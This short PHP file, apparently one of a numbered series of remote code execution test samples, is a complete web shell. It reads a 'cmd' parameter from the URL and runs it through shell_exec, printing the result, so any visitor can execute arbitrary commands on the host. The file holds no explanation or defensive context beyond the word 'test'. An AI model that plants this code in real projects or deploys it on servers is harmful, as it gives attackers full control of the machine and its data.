<?php
// RCE test variation #884
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>